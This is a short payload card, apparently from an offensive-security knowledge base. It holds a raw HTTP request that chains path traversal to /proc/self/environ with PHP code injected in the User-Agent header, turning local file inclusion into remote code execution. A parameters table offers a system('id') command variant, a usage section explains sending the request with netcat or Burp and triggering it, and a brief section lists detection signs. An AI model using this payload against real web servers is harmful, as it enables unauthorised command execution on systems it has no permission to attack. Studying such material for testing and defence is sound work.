---
type: code
language: http
verified: true
tags:
  - lfi
  - rce
  - payload
  - php
platforms:
  - Linux
  - Web
validated: true
---

# raw-http-request-lfi-php-payload

## Code

```http
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

## Description

This raw HTTP request serves as a payload to exploit LFI for RCE by injecting a PHP execution snippet (phpinfo()) into the User-Agent header, poisoning /proc/self/environ for inclusion and execution on a Linux web server.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| vulnerable.php | Vulnerable LFI endpoint path | /path/to/vulnerable.php |
| ../../../proc/self/environ | Path traversal to target file | Adjusted based on directory depth |
| <?=phpinfo(); ?> | PHP payload in User-Agent | <?php system('id'); ?> for command exec |

## Usage

Send this raw request using tools like netcat (nc target 80 < request.txt) or Burp Suite Repeater immediately before an inclusion request. It's ideal for manual testing where curl's header handling might interfere with null bytes. Follow up with a clean inclusion request to trigger execution.

## Detection

- WAF logs showing path traversal in query params (../../../).
- Anomalous User-Agent headers containing PHP tags (<?php).
- Server logs with /proc/self/environ access or unexpected PHP execution (e.g., phpinfo() output in access logs).
- Increased file reads on /proc in process monitoring (e.g., auditd).

## Related

- [[procedures/LFI-to-RCE-via-Proc-Self-Environ]]
- [[tools/Netcat]]
